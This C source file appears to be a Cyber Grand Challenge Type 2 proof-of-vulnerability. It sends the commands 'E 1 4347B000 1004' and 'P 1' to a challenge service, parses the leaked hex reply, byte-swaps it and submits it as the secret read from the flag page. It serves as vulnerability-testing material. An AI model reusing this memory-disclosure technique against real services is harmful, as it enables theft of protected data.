#include <libpov.h>

uint32_t hexStrToUint32(const unsigned char* str)
{
  int i = 0;
  uint32_t ret = 0;
  uint32_t temp = 0;
 
  for (i = 0; str[i] != '\0'; i++)
  {
    ret = ret << 4;
    if ( (str[i] >= '0') && (str[i] <= '9') ) 
    {
      temp = str[i] - '0';
    }
    else if ( (str[i] >= 'A') && (str[i] <= 'F') )
    {
      temp = str[i] - 'A' + 10;
    }
    else if ( (str[i] >= 'a') && (str[i] <= 'f') )
    {
      temp = str[i] - 'a' + 10;
    }
    else
    {
      return (0);
    }
    ret = ret | (temp & 0xF);
  } 

  return (ret);
}

uint32_t flipEndian(uint32_t t)
{
  uint32_t ret = 0;

  ret |= t & 0xFF;
  ret = ret << 8;
  ret |= (t >> 8) & 0xFF;
  ret = ret << 8;
  ret |= (t >> 16) & 0xFF;
  ret = ret << 8;
  ret |= (t >> 24) & 0xFF;

  return (ret);
}

int main(void)
{
  char* s = "E 1 4347B000 1004\n";
  char* p = "P 1\n";
  unsigned char buf[128];
  uint32_t temp = 0;

  type2_vals t2v;
  type2_negotiate(&t2v);

  transmit_all(STDOUT, s, strlen(s));
  transmit_all(STDOUT, p, strlen(p));
  length_read(STDIN, buf, 128);
  buf[8] = '\0';
  temp = hexStrToUint32(buf);
  temp = flipEndian(temp);
  type2_submit((unsigned char*)(&temp), 4);
  return (0);
}

